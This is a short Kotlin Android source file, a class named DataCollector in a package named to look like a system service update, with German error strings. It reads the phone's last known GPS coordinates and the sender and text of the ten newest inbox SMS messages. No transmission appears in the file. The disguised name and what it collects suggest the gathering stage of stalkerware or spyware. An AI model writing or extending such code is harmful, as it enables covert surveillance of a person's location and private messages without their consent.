package com.example.systemserviceupdate

import android.content.Context
import android.location.LocationManager
import android.provider.Telephony

class DataCollector(private val context: Context) {
    
    fun getLocation(): String {
        return try {
            val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
            val location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
            
            if (location != null) {
                "${location.latitude},${location.longitude}"
            } else {
                "0.0,0.0"
            }
        } catch (e: SecurityException) {
            "Berechtigung fehlt"
        } catch (e: Exception) {
            "Fehler: ${e.message}"
        }
    }
    
    fun getSMS(): String {
        return try {
            val cursor = context.contentResolver.query(
                Telephony.Sms.Inbox.CONTENT_URI,
                null, null, null, "date DESC LIMIT 10"
            )
            
            val smsList = mutableListOf<String>()
            cursor?.use {
                while (it.moveToNext()) {
                    val address = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))
                    val body = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY))
                    smsList.add("$address: $body")
                }
            }
            smsList.joinToString(" | ")
        } catch (e: Exception) {
            "SMS Fehler: ${e.message}"
        }
    }
}